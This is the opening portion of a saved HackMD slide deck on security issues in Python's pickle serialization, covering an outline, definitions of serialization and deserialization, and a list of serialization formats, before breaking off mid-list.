<!DOCTYPE html>
<!-- saved from url=(0063)https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/ -->
<html lang="en-GB"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <meta name="mobile-web-app-capable" content="yes">
        
        
        <meta name="description" content="introduction of security issues in python serialization.">
        
        <title>Security Issues in Python Pickle - HackMD</title>
        <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
        <link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
        
<script async="" src="./Security Issues in Python Pickle - HackMD_files/gtm.js"></script><script nonce="">
window.domain = 'hackmd.io'
window.urlpath = ''
window.debug = false
window.version = '1.3.0'
window.brand = 'HackMD'



window.GOOGLE_API_KEY = 'AIzaSyCjSrqWHhmWJnoI7JlD88XDSaBgiKbaenA'
window.GOOGLE_CLIENT_ID = '911617723593-drikdibvvn63slfd6kbqigo8ql1no55s.apps.googleusercontent.com'
window.DROPBOX_APP_KEY = 'rdoizrlnkuha23r'

window.PLANTUML_SERVER = 'https://ptuml.hackmd.io'

window.ASSET_URL = 'https://assets.hackmd.io'

window.USER_CAN_CREATE_TEAM = true
window.USER_CAN_DELETE_ACCOUNT = true
window.USER_DELETE_ACCOUNT_VIA_EMAIL = true
window.PAYMENT_ENABLED = true
window.GITHUB_SYNC_ENABLED = true
window.GITLAB_SYNC_ENABLED = false
window.GITLAB_SYNC_BASE_URL = ''
window.VCS_SYNC_MODE = 'github'
window.VCS_PROVIDER_NAME = 'GitHub'
window.FREE_TEAM_NUM = 3
window.FREE_TEAM_MEMBER_NUM = 3
window.FREE_PUBLIC_TEAM_NUM = 10

window.ALLOW_ANONYMOUS = true
window.ALLOW_ANONYMOUS_EDIT = false
window.PUBLIC_OVERVIEW = false
window.INTERNAL_PUBLIC_OVERVIEW = false
window.FULL_TEXT_SEARCH_ENABLE = false







window.USE_CDN = false





















</script>


        
<!-- Google Tag Manager -->
<script nonce="">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KLW9Z3');</script>
<!-- End Google Tag Manager -->


        <meta property="fb:app_id" content="1436904003272070">

<meta name="twitter:image:src" content="https://avatars.githubusercontent.com/u/16917636?s=400">

<meta name="twitter:site" content="@hackmdio">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Security Issues in Python Pickle - HackMD">

<meta name="twitter:description" content="introduction of security issues in python serialization.">


<meta property="og:image" content="https://avatars.githubusercontent.com/u/16917636?s=400">

<meta property="og:site_name" content="HackMD">
<meta property="og:type" content="article">
<meta property="og:title" content="Security Issues in Python Pickle - HackMD">

<meta property="og:description" content="introduction of security issues in python serialization.">



        
        <link rel="stylesheet" href="./Security Issues in Python Pickle - HackMD_files/reveal.css">
        <link rel="stylesheet" href="./Security Issues in Python Pickle - HackMD_files/emojify.min.css">
         <link href="./Security Issues in Python Pickle - HackMD_files/font-vendor.b86e2bf451b246b1a88e.css" rel="stylesheet"><link href="./Security Issues in Python Pickle - HackMD_files/common-vendor.b8ecfc406ac0b5f77a26.css" rel="stylesheet"><link href="./Security Issues in Python Pickle - HackMD_files/slide-vendor.69891338bef7e9b58324.css" rel="stylesheet"><link href="./Security Issues in Python Pickle - HackMD_files/slide.1a149c66b30e8a9dd6c3.css" rel="stylesheet">
        

        <!-- style-loader will insert style before this div in development -->
        <!-- This prevents overwriting reveal.js theme css -->
        <meta id="style-tag-insertion">

        <!-- For reveal.js theme -->
        
        <link rel="stylesheet" href="./Security Issues in Python Pickle - HackMD_files/black.css" id="theme">
        
        <!-- For overwrite reveal.js -->
        <link rel="stylesheet" href="./Security Issues in Python Pickle - HackMD_files/slide.css">

        <!-- Printing and PDF exports -->
		<script nonce="">
			var link = document.createElement( 'link' );
			link.rel = 'stylesheet';
			link.type = 'text/css';
            link.href = 'https://assets.hackmd.io/build/reveal.js/' + (window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css');
			document.getElementsByTagName( 'head' )[0].appendChild( link );
		</script><link rel="stylesheet" type="text/css" href="./Security Issues in Python Pickle - HackMD_files/pdf.css">

        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
<![endif]-->

    <style>::-moz-focus-inner{border:0 !important;}:focus,.focus{outline: none !important;}</style><script type="text/javascript" src="./Security Issues in Python Pickle - HackMD_files/elapsed-time-bar.js"></script><script type="text/javascript" src="./Security Issues in Python Pickle - HackMD_files/notes.js"></script><style></style><link rel="stylesheet" type="text/css" href="./Security Issues in Python Pickle - HackMD_files/fretboard.f32f2a8d5293869f0195.css"><script charset="utf-8" src="./Security Issues in Python Pickle - HackMD_files/fretboard.0e2da01022161fea12f4.js"></script><style type="text/css">@page{size:998px 728px; margin: 0px;}</style><style type="text/css">.reveal section>img, .reveal section>video, .reveal section>iframe{max-width: 960px; max-height:700px}</style></head>
    <body class="print-pdf" style="width: 998px; height: 728px;">
        <div class="container" data-hard-breaks="true">
            <div class="reveal slide center has-vertical-slides has-horizontal-slides ready" role="application" data-transition-speed="default" data-background-transition="fade" style="">
                <div class="slides" style=""><div class="pdf-page" style="height: 727px;"><div class="slide-background present" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" style="display: block; left: 19px; top: 222.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;1&lt;/span&gt;&lt;/a&gt;"><div><h1 class="raw part" data-startline="NaN" data-endline="NaN"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX" target="_blank" rel="noopener"><img class="emoji" alt=":snake:" src="./Security Issues in Python Pickle - HackMD_files/snake.png" data-position="5" data-size="7"> Security Issues in Python Pickle</a></h1>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/"><span class="slide-number-a">1</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 285px; width: 960px;" data-slide-number="&lt;a href=&quot;#/1&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;2&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="bash hljs">$ whoami
Yihang Wang (Lilac CTF Team, Web Security)
GitHub: https://github.com/wangyihang
E-Mail: wangyihanger@gmail.com
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/1"><span class="slide-number-a">2</span></a></div></div><div class="pdf-page" style="height: 1454px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 14px; width: 960px;" data-slide-number="&lt;a href=&quot;#/2&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;3&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Outlines</h2>
<p class="fragment fade-in" data-fragment-index="0">What is serialization</p>
<p class="fragment fade-in" data-fragment-index="1">How to serialize data</p>
<p class="fragment fade-in" data-fragment-index="2">Pickle in CTF Challenges</p>
<p class="fragment fade-in" data-fragment-index="3">Implementation of Pickle</p>
<p class="fragment fade-in" data-fragment-index="4">Vulnerabilities in Wild</p>
<p class="fragment fade-in" data-fragment-index="5">Mitigation strategies &amp;&amp; Best practices</p>
<p class="fragment fade-in" data-fragment-index="6">Conclusion</p>
<p class="fragment fade-in" data-fragment-index="7">TODOs</p>
<p class="fragment fade-in" data-fragment-index="8">Q&amp;A</p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/2"><span class="slide-number-a">3</span></a></div></div><div class="pdf-page" style="height: 1454px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 14px; width: 960px;" data-slide-number="&lt;a href=&quot;#/2&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;3&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Outlines</h2>
<p class="fragment fade-in visible current-fragment" data-fragment-index="0">What is serialization</p>
<p class="fragment fade-in" data-fragment-index="1">How to serialize data</p>
<p class="fragment fade-in" data-fragment-index="2">Pickle in CTF Challenges</p>
<p class="fragment fade-in" data-fragment-index="3">Implementation of Pickle</p>
<p class="fragment fade-in" data-fragment-index="4">Vulnerabilities in Wild</p>
<p class="fragment fade-in" data-fragment-index="5">Mitigation strategies &amp;&amp; Best practices</p>
<p class="fragment fade-in" data-fragment-index="6">Conclusion</p>
<p class="fragment fade-in" data-fragment-index="7">TODOs</p>
<p class="fragment fade-in" data-fragment-index="8">Q&amp;A</p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/2"><span class="slide-number-a">3</span></a></div></div><div class="pdf-page" style="height: 1454px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 14px; width: 960px;" data-slide-number="&lt;a href=&quot;#/2&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;3&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Outlines</h2>
<p class="fragment fade-in visible" data-fragment-index="0">What is serialization</p>
<p class="fragment fade-in visible current-fragment" data-fragment-index="1">How to serialize data</p>
<p class="fragment fade-in" data-fragment-index="2">Pickle in CTF Challenges</p>
<p class="fragment fade-in" data-fragment-index="3">Implementation of Pickle</p>
<p class="fragment fade-in" data-fragment-index="4">Vulnerabilities in Wild</p>
<p class="fragment fade-in" data-fragment-index="5">Mitigation strategies &amp;&amp; Best practices</p>
<p class="fragment fade-in" data-fragment-index="6">Conclusion</p>
<p class="fragment fade-in" data-fragment-index="7">TODOs</p>
<p class="fragment fade-in" data-fragment-index="8">Q&amp;A</p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/2"><span class="slide-number-a">3</span></a></div></div><div class="pdf-page" style="height: 1454px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 14px; width: 960px;" data-slide-number="&lt;a href=&quot;#/2&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;3&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Outlines</h2>
<p class="fragment fade-in visible" data-fragment-index="0">What is serialization</p>
<p class="fragment fade-in visible" data-fragment-index="1">How to serialize data</p>
<p class="fragment fade-in visible current-fragment" data-fragment-index="2">Pickle in CTF Challenges</p>
<p class="fragment fade-in" data-fragment-index="3">Implementation of Pickle</p>
<p class="fragment fade-in" data-fragment-index="4">Vulnerabilities in Wild</p>
<p class="fragment fade-in" data-fragment-index="5">Mitigation strategies &amp;&amp; Best practices</p>
<p class="fragment fade-in" data-fragment-index="6">Conclusion</p>
<p class="fragment fade-in" data-fragment-index="7">TODOs</p>
<p class="fragment fade-in" data-fragment-index="8">Q&amp;A</p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/2"><span class="slide-number-a">3</span></a></div></div><div class="pdf-page" style="height: 1454px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 14px; width: 960px;" data-slide-number="&lt;a href=&quot;#/2&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;3&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Outlines</h2>
<p class="fragment fade-in visible" data-fragment-index="0">What is serialization</p>
<p class="fragment fade-in visible" data-fragment-index="1">How to serialize data</p>
<p class="fragment fade-in visible" data-fragment-index="2">Pickle in CTF Challenges</p>
<p class="fragment fade-in visible current-fragment" data-fragment-index="3">Implementation of Pickle</p>
<p class="fragment fade-in" data-fragment-index="4">Vulnerabilities in Wild</p>
<p class="fragment fade-in" data-fragment-index="5">Mitigation strategies &amp;&amp; Best practices</p>
<p class="fragment fade-in" data-fragment-index="6">Conclusion</p>
<p class="fragment fade-in" data-fragment-index="7">TODOs</p>
<p class="fragment fade-in" data-fragment-index="8">Q&amp;A</p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/2"><span class="slide-number-a">3</span></a></div></div><div class="pdf-page" style="height: 1454px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 14px; width: 960px;" data-slide-number="&lt;a href=&quot;#/2&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;3&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Outlines</h2>
<p class="fragment fade-in visible" data-fragment-index="0">What is serialization</p>
<p class="fragment fade-in visible" data-fragment-index="1">How to serialize data</p>
<p class="fragment fade-in visible" data-fragment-index="2">Pickle in CTF Challenges</p>
<p class="fragment fade-in visible" data-fragment-index="3">Implementation of Pickle</p>
<p class="fragment fade-in visible current-fragment" data-fragment-index="4">Vulnerabilities in Wild</p>
<p class="fragment fade-in" data-fragment-index="5">Mitigation strategies &amp;&amp; Best practices</p>
<p class="fragment fade-in" data-fragment-index="6">Conclusion</p>
<p class="fragment fade-in" data-fragment-index="7">TODOs</p>
<p class="fragment fade-in" data-fragment-index="8">Q&amp;A</p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/2"><span class="slide-number-a">3</span></a></div></div><div class="pdf-page" style="height: 1454px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 14px; width: 960px;" data-slide-number="&lt;a href=&quot;#/2&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;3&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Outlines</h2>
<p class="fragment fade-in visible" data-fragment-index="0">What is serialization</p>
<p class="fragment fade-in visible" data-fragment-index="1">How to serialize data</p>
<p class="fragment fade-in visible" data-fragment-index="2">Pickle in CTF Challenges</p>
<p class="fragment fade-in visible" data-fragment-index="3">Implementation of Pickle</p>
<p class="fragment fade-in visible" data-fragment-index="4">Vulnerabilities in Wild</p>
<p class="fragment fade-in visible current-fragment" data-fragment-index="5">Mitigation strategies &amp;&amp; Best practices</p>
<p class="fragment fade-in" data-fragment-index="6">Conclusion</p>
<p class="fragment fade-in" data-fragment-index="7">TODOs</p>
<p class="fragment fade-in" data-fragment-index="8">Q&amp;A</p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/2"><span class="slide-number-a">3</span></a></div></div><div class="pdf-page" style="height: 1454px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 14px; width: 960px;" data-slide-number="&lt;a href=&quot;#/2&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;3&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Outlines</h2>
<p class="fragment fade-in visible" data-fragment-index="0">What is serialization</p>
<p class="fragment fade-in visible" data-fragment-index="1">How to serialize data</p>
<p class="fragment fade-in visible" data-fragment-index="2">Pickle in CTF Challenges</p>
<p class="fragment fade-in visible" data-fragment-index="3">Implementation of Pickle</p>
<p class="fragment fade-in visible" data-fragment-index="4">Vulnerabilities in Wild</p>
<p class="fragment fade-in visible" data-fragment-index="5">Mitigation strategies &amp;&amp; Best practices</p>
<p class="fragment fade-in visible current-fragment" data-fragment-index="6">Conclusion</p>
<p class="fragment fade-in" data-fragment-index="7">TODOs</p>
<p class="fragment fade-in" data-fragment-index="8">Q&amp;A</p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/2"><span class="slide-number-a">3</span></a></div></div><div class="pdf-page" style="height: 1454px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 14px; width: 960px;" data-slide-number="&lt;a href=&quot;#/2&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;3&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Outlines</h2>
<p class="fragment fade-in visible" data-fragment-index="0">What is serialization</p>
<p class="fragment fade-in visible" data-fragment-index="1">How to serialize data</p>
<p class="fragment fade-in visible" data-fragment-index="2">Pickle in CTF Challenges</p>
<p class="fragment fade-in visible" data-fragment-index="3">Implementation of Pickle</p>
<p class="fragment fade-in visible" data-fragment-index="4">Vulnerabilities in Wild</p>
<p class="fragment fade-in visible" data-fragment-index="5">Mitigation strategies &amp;&amp; Best practices</p>
<p class="fragment fade-in visible" data-fragment-index="6">Conclusion</p>
<p class="fragment fade-in visible current-fragment" data-fragment-index="7">TODOs</p>
<p class="fragment fade-in" data-fragment-index="8">Q&amp;A</p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/2"><span class="slide-number-a">3</span></a></div></div><div class="pdf-page" style="height: 1454px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 14px; width: 960px;" data-slide-number="&lt;a href=&quot;#/2&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;3&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Outlines</h2>
<p class="fragment fade-in visible" data-fragment-index="0">What is serialization</p>
<p class="fragment fade-in visible" data-fragment-index="1">How to serialize data</p>
<p class="fragment fade-in visible" data-fragment-index="2">Pickle in CTF Challenges</p>
<p class="fragment fade-in visible" data-fragment-index="3">Implementation of Pickle</p>
<p class="fragment fade-in visible" data-fragment-index="4">Vulnerabilities in Wild</p>
<p class="fragment fade-in visible" data-fragment-index="5">Mitigation strategies &amp;&amp; Best practices</p>
<p class="fragment fade-in visible" data-fragment-index="6">Conclusion</p>
<p class="fragment fade-in visible" data-fragment-index="7">TODOs</p>
<p class="fragment fade-in visible current-fragment" data-fragment-index="8">Q&amp;A</p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/2"><span class="slide-number-a">3</span></a></div></div><section hidden="" aria-hidden="true" class="stack present" style="display: block;" data-slide-number="&lt;a href=&quot;#/3&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;4&lt;/span&gt;&lt;/a&gt;"><div class="pdf-page" style="height: 727px;"><div class="slide-background present" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" style="display: block; left: 19px; top: 314px; width: 960px;" data-slide-number="&lt;a href=&quot;#/3&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;1&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Serialization &amp; De-Serialization</h2>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/3"><span class="slide-number-a">4</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">1</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 116.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/3/1&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;2&lt;/span&gt;&lt;/a&gt;"><div><p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/serialize-deserialize-java.png" alt="" class="" data-position="NaN" data-size="101"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/3/1"><span class="slide-number-a">4</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">2</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 238px; width: 960px;" data-slide-number="&lt;a href=&quot;#/3/2&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;3&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Serialization</h4>
<p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">It is the process of <strong data-position="NaN" data-size="0">translating data structures or object state</strong> into <strong data-position="NaN" data-size="0">bytes</strong> format that can be stored on disk or database or transmitted over the network.</p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/3/2"><span class="slide-number-a">4</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">3</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 265px; width: 960px;" data-slide-number="&lt;a href=&quot;#/3/3&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;4&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">De-Serialization</h4>
<p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">It is the opposite process, which means to, extract <strong data-position="NaN" data-size="0">data structure or object</strong> from <strong data-position="NaN" data-size="0">series of bytes</strong>.</p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/3/3"><span class="slide-number-a">4</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">4</span></a></div></div></section><section hidden="" aria-hidden="true" class="stack present" style="display: block;" data-slide-number="&lt;a href=&quot;#/4&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;5&lt;/span&gt;&lt;/a&gt;"><div class="pdf-page" style="height: 727px;"><div class="slide-background present" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" hidden="" aria-hidden="true" class="present" style="display: block; left: 19px; top: 321.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/4&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;1&lt;/span&gt;&lt;/a&gt;"><div><h3 class="raw part" data-startline="NaN" data-endline="NaN">How to serialzation</h3>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/4"><span class="slide-number-a">5</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">1</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 99px; width: 960px;" data-slide-number="&lt;a href=&quot;#/4/1&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;2&lt;/span&gt;&lt;/a&gt;"><div><ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">JSON</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">BSON</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">XML</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Yaml</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img class="emoji" alt=":snake:" src="./Security Issues in Python Pickle - HackMD_files/snake.png" data-position="30" data-size="7"> Python
<ul>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">
<p class="fragment highlight-red" data-fragment-index="0">Pickle</p>
</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">marshal</li>
</ul>
</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img class="emoji" alt=":elephant:" src="./Security Issues in Python Pickle - HackMD_files/elephant.png" data-position="112" data-size="10"> PHP
<ul>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">PHP-Serializer</li>
</ul>
</li>
</ul>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/4/1"><span class="slide-number-a">5</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">2</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 99px; width: 960px;" data-slide-number="&lt;a href=&quot;#/4/1&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;2&lt;/span&gt;&lt;/a&gt;"><div><ul class="part" data-startline="NaN" data-endline="NaN">
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">JSON</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">BSON</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">XML</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0">Yaml</li>
<li class="" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img class="emoji" alt=":snake:" src="./Security Issues in Python Pickle - HackMD_files/snake.png" data-position="30" data-size="7"> Python
<ul>
